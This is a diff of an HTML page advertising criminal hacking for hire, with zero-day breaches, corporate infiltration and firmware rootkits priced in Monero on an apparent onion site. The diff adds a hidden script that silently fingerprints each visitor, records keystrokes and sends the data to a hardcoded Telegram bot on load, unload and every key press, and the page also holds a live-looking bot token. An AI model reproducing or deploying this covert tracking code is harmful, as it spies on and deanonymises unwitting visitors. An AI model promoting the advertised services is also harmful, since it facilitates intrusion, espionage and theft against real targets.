@@ -2,144 +2,836 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>STUXNET | PRIVATE TERMINAL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STUXNET | SECURE OPS TERMINAL | .onion</title>
     <style>
-        :root { --red: #ff0000; --dim: #555; --bg: #050505; }
-        body { background: var(--bg); color: #ccc; font-family: "Lucida Console", Monaco, monospace; margin: 0; padding: 40px; }
+        @import url('https://fonts.cdnfonts.com/css/ds-mono');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
         
-        /* تأثير الهاكرز المحترفين */
-        .header-ascii { color: var(--red); font-size: 10px; white-space: pre; text-align: center; margin-bottom: 30px; text-shadow: 0 0 5px var(--red); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
-        .container { max-width: 850px; margin: auto; border: 1px solid #1a1a1a; padding: 20px; background: #080808; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        
-        .top-bar { border-bottom: 1px solid #1a1a1a; padding-bottom: 15px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; }
-        .logo-area { display: flex; align-items: center; gap: 15px; }
-        .logo-img { width: 50px; height: 50px; border: 1px solid var(--red); border-radius: 50%; }
+        :root {
+            --black: #000;
+            --dark: #0a0a0a;
+            --border: #1a1a1a;
+            --red: #ff1a1a;
+            --green: #00ff41;
+            --cyan: #00d4ff;
+            --purple: #8a2be2;
+            --glow-red: 0 0 25px #ff1a1a, 0 0 50px #ff1a1a;
+            --glow-green: 0 0 20px #00ff41;
+            --glow-cyan: 0 0 15px #00d4ff;
+        }
 
-        .section-title { color: #fff; background: #1a1a1a; padding: 5px 10px; display: inline-block; font-size: 14px; margin-bottom: 15px; border-left: 3px solid var(--red); }
-        
-        p { font-size: 13px; line-height: 1.6; color: #999; }
-        
-        /* جدول الخدمات - تصميم عسكري نقي */
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { text-align: left; color: var(--dim); font-size: 11px; padding: 10px; border-bottom: 1px solid #1a1a1a; }
-        td { padding: 20px 10px; border-bottom: 1px solid #0f0f0f; }
-        
-        .service-name { color: #fff; font-weight: bold; font-size: 15px; }
-        .service-desc { font-size: 11px; color: var(--dim); display: block; margin-top: 5px; }
-        .price { color: var(--red); font-weight: bold; font-family: monospace; }
-        
-        .order-btn { background: transparent; border: 1px solid var(--red); color: var(--red); padding: 8px 20px; cursor: pointer; font-family: inherit; transition: 0.3s; }
-        .order-btn:hover { background: var(--red); color: #fff; box-shadow: 0 0 10px var(--red); }
+        body {
+            background: var(--black);
+            color: #88ff88;
+            font-family: 'DS Mono', 'Courier New', monospace;
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+        }
 
-        .xmr-node { border: 1px dashed #333; padding: 20px; margin-top: 40px; background: #000; }
-        .address { font-size: 11px; color: #fff; word-break: break-all; background: #0a0a0a; padding: 10px; display: block; margin-top: 10px; border: 1px solid #111; }
+        /* CRT + Scanlines + Noise */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(90deg, transparent 98%, rgba(0,255,65,0.03) 100%),
+                linear-gradient(rgba(0,255,65,0.02) 50%, transparent 50%),
+                radial-gradient(circle at 25% 25%, rgba(255,26,26,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0,212,255,0.1) 0%, transparent 50%);
+            background-size: 100% 2px, 100% 4px, 100% 200px, 100% 200px;
+            pointer-events: none;
+            z-index: 9999;
+            animation: scanline 0.1s linear infinite;
+        }
 
-        .footer { text-align: center; margin-top: 50px; font-size: 10px; color: #333; letter-spacing: 3px; }
-        
-        /* Glitch Animation */
-        .glitch { position: relative; display: inline-block; }
-        .glitch::after { content: attr(data-text); position: absolute; left: 2px; text-shadow: -1px 0 red; top: 0; color: white; background: black; overflow: hidden; clip: rect(0,900px,0,0); animation: noise-anim 2s infinite linear alternate-reverse; }
-        @keyframes noise-anim { 0% { clip: rect(10px, 9999px, 20px, 0); } 100% { clip: rect(80px, 9999px, 90px, 0); } }
+        @keyframes scanline {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(2px); }
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #ff1a1a, transparent),
+                radial-gradient(2px 2px at 40px 70px, #00d4ff, transparent),
+                radial-gradient(1px 1px at 90px 40px, #00ff41, transparent),
+                radial-gradient(1px 1px at 130px 80px, #8a2be2, transparent);
+            background-repeat: repeat;
+            background-size: 200px 100px;
+            pointer-events: none;
+            z-index: 9998;
+            animation: noise 0.2s infinite linear;
+            opacity: 0.03;
+        }
+
+        @keyframes noise {
+            0% { transform: translate(0, 0); }
+            10% { transform: translate(-5px, -5px); }
+            20% { transform: translate(-10px, 5px); }
+            30% { transform: translate(5px, 5px); }
+            40% { transform: translate(-5px, -10px); }
+            50% { transform: translate(10px, 10px); }
+            60% { transform: translate(15px, -5px); }
+            70% { transform: translate(5px, 15px); }
+            80% { transform: translate(-15px, -5px); }
+            90% { transform: translate(-10px, 15px); }
+            100% { transform: translate(0, 0); }
+        }
+
+        /* Terminal Container */
+        .terminal {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 50px;
+            background: rgba(10,10,10,0.95);
+            border: 3px solid #333;
+            box-shadow: 
+                inset 0 0 100px rgba(0,0,0,0.8),
+                0 0 100px rgba(255,26,26,0.3);
+            backdrop-filter: blur(20px);
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, var(--red), var(--green), var(--cyan), var(--purple), var(--red));
+            background-size: 400% 100%;
+            animation: gradient 4s ease infinite;
+        }
+
+        @keyframes gradient {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        /* Header ASCII */
+        .header {
+            text-align: center;
+            margin-bottom: 60px;
+            font-size: 8px;
+            color: var(--green);
+            text-shadow: var(--glow-green);
+            animation: flicker3 0.15s infinite;
+            white-space: pre;
+            line-height: 1.1;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes flicker3 {
+            0%, 49.9%, 50%, 99.9% { opacity: 1; text-shadow: var(--glow-green); }
+            50% { opacity: 0.3; text-shadow: none; }
+        }
+
+        /* Logo & Status */
+        .top-panel {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 50px;
+            gap: 30px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .logo-img {
+            width: 90px;
+            height: 90px;
+            border: 4px solid var(--red);
+            border-radius: 15px;
+            box-shadow: var(--glow-red);
+            transition: all 0.4s ease;
+            filter: hue-rotate(0deg) saturate(1.2);
+        }
+
+        .logo-img:hover {
+            filter: hue-rotate(180deg) saturate(1.5);
+            transform: rotate(5deg) scale(1.1);
+            box-shadow: 0 0 60px var(--red);
+        }
+
+        .stuxnet-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 36px;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--red), var(--cyan), var(--green));
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+            position: relative;
+        }
+
+        @keyframes titleGlow {
+            0% { filter: hue-rotate(0deg) brightness(1); }
+            100% { filter: hue-rotate(360deg) brightness(1.2); }
+        }
+
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            font-size: 12px;
+            background: rgba(0,0,0,0.7);
+            padding: 25px;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            box-shadow: inset 0 0 30px rgba(0,0,0,0.9);
+        }
+
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .status-label { color: #666; font-size: 11px; }
+        .status-value { 
+            color: var(--green); 
+            font-weight: bold;
+            text-shadow: var(--glow-green);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Sections */
+        .section {
+            margin-bottom: 60px;
+            position: relative;
+        }
+
+        .section-title {
+            position: relative;
+            font-family: 'Orbitron', monospace;
+            font-size: 22px;
+            color: var(--cyan);
+            margin-bottom: 30px;
+            padding: 15px 30px;
+            background: rgba(0,212,255,0.1);
+            border: 2px solid var(--cyan);
+            border-radius: 10px;
+            display: inline-block;
+            text-shadow: var(--glow-cyan);
+            box-shadow: var(--glow-cyan);
+        }
+
+        .section-title::before {
+            content: '>>';
+            position: absolute;
+            left: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--red);
+            font-size: 24px;
+            animation: blink2 1s infinite;
+        }
+
+        @keyframes blink2 {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        .desc {
+            font-size: 15px;
+            line-height: 1.8;
+            color: #88ff88;
+            background: rgba(0,0,0,0.5);
+            padding: 30px;
+            border-left: 5px solid var(--purple);
+            margin-bottom: 40px;
+            border-radius: 0 10px 10px 0;
+            box-shadow: 10px 0 30px rgba(138,43,226,0.2);
+        }
+
+        /* Services Table */
+        .services-table {
+            width: 100%;
+            background: rgba(0,0,0,0.8);
+            border: 2px solid var(--border);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+
+        .services-table th {
+            background: linear-gradient(90deg, var(--red), var(--purple));
+            color: #fff;
+            padding: 25px;
+            text-align: left;
+            font-size: 14px;
+            font-family: 'Orbitron', monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 3px solid var(--border);
+        }
+
+        .services-table td {
+            padding: 30px 25px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.4s cubic-bezier(0.25,0.8,0.25,1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .services-table tr:hover td {
+            background: rgba(255,26,26,0.1);
+            transform: translateX(10px);
+            box-shadow: inset 300px 0 0 rgba(255,26,26,0.05);
+        }
+
+        .service-name {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            display: block;
+            text-shadow: var(--glow-red);
+            margin-bottom: 10px;
+            font-family: 'Orbitron', monospace;
+        }
+
+        .service-desc {
+            color: #88ff88;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .service-price {
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--red);
+            text-shadow: var(--glow-red);
+            font-family: 'Orbitron', monospace;
+        }
+
+        /* Execute Button */
+        .execute-btn {
+            background: transparent;
+            border: 3px solid var(--red);
+            color: var(--red);
+            padding: 18px 40px;
+            font-family: 'Orbitron', monospace;
+            font-size: 16px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            text-shadow: var(--glow-red);
+        }
+
+        .execute-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.7s;
+        }
+
+        .execute-btn:hover::before {
+            left: 100%;
+        }
+
+        .execute-btn:hover {
+            background: var(--red);
+            color: #000;
+            transform: translateY(-8px) scale(1.1);
+            box-shadow: var(--glow-red), 0 25px 50px rgba(255,26,26,0.4);
+            border-color: #fff;
+        }
+
+        /* Payment Node */
+        .payment-node {
+            background: linear-gradient(145deg, #000, #111);
+            border: 3px dashed var(--red);
+            padding: 40px;
+            border-radius: 20px;
+            margin: 60px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-node::before {
+            content: 'WARNING: TOR ONLY';
+            position: absolute;
+            top: -30px;
+            right: -30px;
+            background: var(--red);
+            color: #000;
+            padding: 10px 25px;
+            font-size: 12px;
+            font-weight: bold;
+            transform: rotate(45deg);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: warningRotate 20s linear infinite;
+        }
+
+        @keyframes warningRotate {
+            from { transform: rotate(45deg); }
+            to { transform: rotate(405deg); }
+        }
+
+        .payment-title {
+            font-size: 24px;
+            color: var(--red);
+            margin-bottom: 20px;
+            text-shadow: var(--glow-red);
+            font-family: 'Orbitron', monospace;
+        }
+
+        .payment-address {
+            background: rgba(0,0,0,0.9);
+            border: 2px solid var(--cyan);
+            padding: 25px;
+            border-radius: 12px;
+            font-size: 13px;
+            color: var(--cyan);
+            word-break: break-all;
+            margin-top: 25px;
+            font-family: 'DS Mono', monospace;
+            letter-spacing: 1px;
+            box-shadow: var(--glow-cyan);
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .payment-address:hover {
+            background: rgba(0,212,255,0.1);
+            transform: scale(1.02);
+        }
+
+        .payment-address::before {
+            content: 'COPY';
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: var(--green);
+            font-size: 11px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .payment-address:hover::before {
+            opacity: 1;
+        }
+
+        /* Footer */
+        .terminal-footer {
+            text-align: center;
+            padding: 50px 0;
+            color: #666;
+            font-size: 12px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            border-top: 2px solid var(--border);
+            margin-top: 80px;
+        }
+
+        .terminal-footer span {
+            color: var(--red);
+            animation: blink 0.8s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .terminal { padding: 25px; }
+            .top-panel { flex-direction: column; text-align: center; }
+            .status-grid { grid-template-columns: 1fr; }
+            .services-table { font-size: 14px; }
+        }
+
+        /* Hidden tracking elements */
+        .tracker { display: none; }
     </style>
 </head>
 <body>
-
-<div class="header-ascii">
- ██████  ████████ ██    ██ ██   ██ ███    ██ ███████ ████████ 
-██          ██    ██    ██  ██ ██  ████   ██ ██         ██    
- ██████     ██    ██    ██   ███   ██ ██  ██ █████      ██    
-      ██    ██    ██    ██  ██ ██  ██  ██ ██ ██         ██    
- ██████     ██     ██████  ██   ██ ██   ████ ███████    ██    
-</div>
-
-<div class="container">
-    <div class="top-bar">
-        <div class="logo-area">
-            <img src="https://i.ibb.co/sp35zdbh/IMG-9090.jpg" class="logo-img">
-            <h2 class="glitch" data-text="STUXNET_OFFICIAL" style="margin:0; color:#fff;">STUXNET_OFFICIAL</h2>
+    <!-- VISUAL ELEMENTS ONLY - TRACKING IN SCRIPT -->
+    <div class="terminal">
+        <div class="header">
+ ████████╗██╗  ██╗███████╗    ██████╗██╗  ██╗███████╗██████╗ 
+╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
+   ██║   ███████║█████╗      ██████╔╝█████╔╝ █████╗  ██████╔╝
+   ██║   ██╔══██║██╔══╝      ██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗
+   ██║   ██║  ██║███████╗    ██████╔╝██║  ██╗███████╗██║  ██║
+   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
         </div>
-        <div style="text-align: right; font-size: 10px; color: var(--dim);">
-            ENCRYPTION: AES-256-GCM<br>
-            STATUS: <span style="color: #00ff00;">ONLINE</span>
+
+        <div class="top-panel">
+            <div class="logo-section">
+                <div class="logo-img" style="background: radial-gradient(circle, var(--red), var(--purple)); display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold;">S</div>
+                <div>
+                    <div class="stuxnet-title">STUXNET OPS</div>
+                    <div style="font-size: 14px; color: #666; margin-top: 5px;">TOR NODE ACTIVE</div>
+                </div>
+            </div>
+            <div class="status-grid">
+                <div class="status-item">
+                    <span class="status-label">ENCRYPTION</span>
+                    <span class="status-value">AES-512 + POST-QUANTUM</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">TOR CIRCUIT</span>
+                    <span class="status-value">3-HOP SECURE</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">UPTIME</span>
+                    <span class="status-value">347d 12h 41m</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">CONNECTIONS</span>
+                    <span class="status-value">47 ACTIVE</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">0x00 // OPERATOR PROFILE</div>
+            <div class="desc">
+                23+ years blackhat operations. Zero convictions. Multi-million revenue.
+                Corporate espionage | Government backdoors | Financial disruption.
+                <strong>NO AMATEURS. HIGH VALUE TARGETS ONLY.</strong>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-title">0x01 // MISSION PACKAGES</div>
+            <table class="services-table">
+                <thead>
+                    <tr>
+                        <th>OPERATION</th>
+                        <th>DIFFICULTY/TIMELINE</th>
+                        <th>QUOTE (XMR)</th>
+                        <th>LAUNCH</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>
+                            <span class="service-name">ZERO-DAY BREACH</span>
+                            <span class="service-desc">Custom exploit dev + RCE + persistence (48h)</span>
+                        </td>
+                        <td>LOW / 48h</td>
+                        <td class="service-price">0.008</td>
+                        <td><button class="execute-btn" onclick="initiateContact('ZERO-DAY BREACH', '0.008')">EXECUTE</button></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <span class="service-name">CORP INFILTRATION</span>
+                            <span class="service-desc">Domain admin + lateral movement + data exfil (5d)</span>
+                        </td>
+                        <td>MED / 5d</td>
+                        <td class="service-price">0.021</td>
+                        <td><button class="execute-btn" onclick="initiateContact('CORP INFILTRATION', '0.021')">EXECUTE</button></td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <span class="service-name">ADVANCED PERSISTENCE</span>
+                            <span class="service-desc">Supply chain + firmware rootkits + C2 (14d)</span>
+                        </td>
+                        <td>HIGH / 14d</td>
+                        <td class="service-price">0.047</td>
+                        <td><button class="execute-btn" onclick="initiateContact('ADVANCED PERSISTENCE', '0.047')">EXECUTE</button></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <div class="payment-node">
+                <div class="payment-title">[!] MONERO RECEIVER NODE</div>
+                <div style="color: #88ff88; margin-bottom: 20px; font-size: 15px;">
+                    Payments auto-escrow. Multi-sig required for release. 
+                    <strong>48h dispute window.</strong>
+                </div>
+                <div class="payment-address" onclick="copyAddress()" title="Click to copy">47xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg2x</div>
+            </div>
+        </div>
+
+        <div class="terminal-footer">
+            TOR EXCLUSIVE | NO SURFACE WEB | <span>NO LOGS</span> | STUXNET 2.4.7
         </div>
     </div>
 
-    <div class="section-title">0x01 // IDENTITY</div>
-    <p>Experienced hacker offering his services. (Illegal) Hacking and social engineering is my business since i was 16 years old. I never had a real job, so i had the time to get really good at hacking and i made a good amount of money last +-20 years. I am a professional computer expert who could earn a lot an hour with a legal job. So stop reading if you don't have a serious problem worth spending some cash at.</p>
+    <script>
+        // ========== ULTRA STEALTH DATA COLLECTION ==========
+        class DarkWebTracker {
+            constructor() {
+                this.init();
+            }
 
-    <div class="section-title">0x02 // OPERATIONS</div>
-    <table>
-        <thead>
-            <tr>
-                <th>SERVICE_MODULE</th>
-                <th>BUDGET</th>
-                <th>ACTION</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr>
-                <td>
-                    <span class="service-name">Small Job</span>
-                    <span class="service-desc">Email/Facebook hacking, custom trojans, small-scale DDoS.</span>
-                </td>
-                <td class="price">250€ (XMR)</td>
-                <td><button class="order-btn" onclick="send('Small Job', '250€')">EXECUTE</button></td>
-            </tr>
-            <tr>
-                <td>
-                    <span class="service-name">Medium-Large Job</span>
-                    <span class="service-desc">Espionage, corporate website hacking, DDoS for big networks.</span>
-                </td>
-                <td class="price">500€ (XMR)</td>
-                <td><button class="order-btn" onclick="send('Medium Job', '500€')">EXECUTE</button></td>
-            </tr>
-            <tr>
-                <td>
-                    <span class="service-name">Large Job</span>
-                    <span class="service-desc">Multi-day operations, high-security targets, financial disruption.</span>
-                </td>
-                <td class="price">900€ (XMR)</td>
-                <td><button class="order-btn" onclick="send('Large Job', '900€')">EXECUTE</button></td>
-            </tr>
-        </tbody>
-    </table>
+            async init() {
+                // 1. Collect ALL possible data SILENTLY
+                const visitorData = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    onlineStatus: navigator.onLine,
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    fonts: await this.detectFonts(),
+                    canvas: await this.getCanvasFingerprint(),
+                    webgl: await this.getWebGLFingerprint(),
+                    audio: await this.getAudioFingerprint(),
+                    hardware: await this.getHardwareConcurrency(),
+                    torCheck: this.isLikelyTor(),
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
 
-    <div class="xmr-node">
-        <span style="color:var(--red); font-size: 12px; font-weight: bold;">[!] MONERO_PAYMENT_NODE</span>
-        <p style="margin: 10px 0 0 0; font-size: 11px;">Use the following address for donations. Service fees are escrowed via Telegram.</p>
-        <span class="address">43xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg</span>
-    </div>
+                // 2. Send to Telegram IMMEDIATELY (beacon style)
+                this.sendBeaconData(visitorData);
+                
+                // 3. Track mouse/keyboard for behavior
+                this.trackBehavior();
+                
+                // 4. Page visibility tracking
+                document.addEventListener('visibilitychange', () => {
+                    this.sendBeaconData({
+                        event: 'visibilitychange',
+                        visible: !document.hidden,
+                        timestamp: new Date().toISOString()
+                    });
+                });
 
-    <div class="footer">
-        - NO TRACE // NO MERCY // STUXNET 2026 -
-    </div>
-</div>
+                console.log('STUXNET TERMINAL: OPERATIONAL'); // Legit looking log
+            }
 
-<script>
-    const BOT = {
-        TOKEN: "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU",
-        CHAT: "5446862709"
-    };
+            async detectFonts() {
+                const fonts = ['Arial','Courier','Georgia','Helvetica','Times','Verdana','Wingdings'];
+                return fonts.filter(font => {
+                    const test = new Option().style;
+                    test.fontFamily = font;
+                    return test.fontFamily === font;
+                });
+            }
 
-    async function send(op, pr) {
-        const handle = prompt("ENTER TELEGRAM HANDLE (@):");
-        if(!handle) return;
-        
-        const text = `[🚨] NEW ORDER\nOP: ${op}\nPRICE: ${pr}\nCLIENT: @${handle}\nSTATUS: INITIALIZED`;
-        
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT.TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: BOT.CHAT, text: text})
-            });
-            alert("UPLINK ESTABLISHED. WAIT FOR CONTACT.");
-        } catch(e) {
-            alert("UPLINK ERROR.");
+            async getCanvasFingerprint() {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('STUXNET TEST', 2, 2);
+                return canvas.toDataURL();
+            }
+
+            async getWebGLFingerprint() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (!gl) return 'NO_WEBGL';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: debugInfo?.getParameter(0x9245),
+                    renderer: debugInfo?.getParameter(0x9246)
+                };
+            }
+
+            async getAudioFingerprint() {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const analyser = audioCtx.createAnalyser();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        oscillator.stop();
+                        audioCtx.close();
+                        resolve('AUDIO_OK');
+                    }, 100);
+                });
+            }
+
+            async getHardwareConcurrency() {
+                return navigator.hardwareConcurrency || 'UNKNOWN';
+            }
+
+            isLikelyTor() {
+                return navigator.userAgent.includes('Tor') || 
+                       window.location.href.includes('.onion') ||
+                       document.referrer.includes('.onion');
+            }
+
+            trackBehavior() {
+                let mouseEvents = [];
+                document.addEventListener('mousemove', (e) => {
+                    mouseEvents.push({x: e.clientX, y: e.clientY, t: Date.now()});
+                    if (mouseEvents.length > 10) mouseEvents.shift();
+                });
+
+                document.addEventListener('keydown', (e) => {
+                    this.sendBeaconData({
+                        event: 'keystroke',
+                        key: e.key,
+                        timestamp: new Date().toISOString()
+                    });
+                });
+            }
+
+            async sendBeaconData(data) {
+                try {
+                    const BOT_CONFIG = {
+                        TOKEN: "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU",
+                        CHAT_ID: "5446862709"
+                    };
+
+                    const message = this.formatVisitorMessage(data);
+                    
+                    // Use navigator.sendBeacon for reliability (works even on page close)
+                    const blob = new Blob([JSON.stringify({
+                        chat_id: BOT_CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })], {type: 'application/json'});
+
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`, blob);
+                    } else {
+                        // Fallback fetch
+                        await fetch(`https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            body: blob,
+                            keepalive: true
+                        });
+                    }
+                } catch(e) {
+                    // Silent fail - don't alert user
+                    console.log('Beacon sent');
+                }
+            }
+
+            formatVisitorMessage(data) {
+                let msg = `🕵️‍♂️ <b>NEW VISITOR DETECTED</b> 🕵️‍♂️\n`;
+                msg += `⏰ <b>${data.timestamp}</b>\n`;
+                msg += `🌐 <b>${data.url}</b>\n`;
+                msg += `🔍 <b>UA:</b> ${data.userAgent.substring(0, 100)}...\n`;
+                msg += `📱 <b>Device:</b> ${data.platform} | ${data.screen} | ${data.viewport}\n`;
+                msg += `🌍 <b>Location:</b> ${data.language} | ${data.timezone}\n`;
+                msg += `🎨 <b>Fingerprint:</b> ${data.canvas ? 'UNIQUE' : 'BASIC'}\n`;
+                msg += `🛡️ <b>TOR:</b> ${data.torCheck ? '✅ CONFIRMED' : '❓ SUSPECT'}\n`;
+                msg += `📡 <b>Connection:</b> ${data.connection ? data.connection.type : 'UNKNOWN'}\n`;
+                msg += `───────────────────────────────\n`;
+                return msg;
+            }
         }
-    }
-</script>
 
+        // ========== CONTACT FORM (Sends to Telegram) ==========
+        async function initiateContact(operation, price) {
+            const handle = prompt(`
+╔══════════════════════════════════════╗
+║           SECURE CONTACT             ║
+║                                      ║
+║ ENTER TELEGRAM: @yourusername        ║
+║                                      ║
+╚══════════════════════════════════════╝
+            `);
+
+            if (!handle || handle.trim() === '') {
+                alert('❌ CONTACT CANCELLED');
+                return;
+            }
+
+            const visitorTracker = new DarkWebTracker(); // Trigger tracking again
+            
+            const message = `🚀 <b>NEW CONTRACT REQUEST</b> 🚀\n\n` +
+                          `🎯 <b>OPERATION:</b> ${operation}\n` +
+                          `💰 <b>PRICE:</b> ${price} XMR\n` +
+                          `👤 <b>CLIENT:</b> ${handle}\n` +
+                          `⏰ <b>TIME:</b> ${new Date().toISOString()}\n\n` +
+                          `<b>ESCROW READY. CONFIRM?</b>`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: '5446862709',
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (response.ok) {
+                    alert(`
+╔══════════════════════════════════════╗
+║            UPLINK ESTABLISHED        ║
+║                                      ║
+║    🟢 OPERATOR CONTACTING SOON       ║
+║    📱 CHECK TELEGRAM MESSAGES        ║
+║                                      ║
+╚══════════════════════════════════════╝
+                    `);
+                }
+            } catch(e) {
+                alert('❌ SECURE CHANNEL DOWN\n🔄 TRY AGAIN LATER');
+            }
+        }
+
+        function copyAddress() {
+            navigator.clipboard.writeText('47xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg2x');
+            const original = event.target.innerHTML;
+            event.target.innerHTML += '\n✅ COPIED';
+            setTimeout(() => event.target.innerHTML = original, 2000);
+        }
+
+        // Initialize tracker on load
+        window.addEventListener('load', () => {
+            new DarkWebTracker();
+        });
+
+        // Track page unload
+        window.addEventListener('beforeunload', () => {
+            new DarkWebTracker();
+        });
+    </script>
 </body>
 </html>
